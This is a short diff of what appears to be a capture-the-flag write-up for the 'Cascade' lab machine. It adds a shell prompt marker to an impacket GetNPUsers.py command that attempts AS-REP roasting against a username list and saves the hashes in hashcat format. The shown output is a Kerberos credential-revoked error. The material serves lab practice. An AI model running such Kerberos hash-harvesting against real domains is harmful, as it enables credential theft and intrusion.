@@ -89,7 +89,7 @@ util
 ### Port 88 (Kerberos)
 Now we could try seeing if we can do AS-REP roasting attacks with just the usernames with `impacket`'s `GetNPUsers.py` module:
 ```
-python GetNPUsers.py CASCADE/ -usersfile ~/htb/cascade/enum/users -format hashcat -output ~/htb/cascade/hashes.asperoast -dc-ip cascade.htb
+$ python GetNPUsers.py CASCADE/ -usersfile ~/htb/cascade/enum/users -format hashcat -output ~/htb/cascade/hashes.asperoast -dc-ip cascade.htb
 Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation
 
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
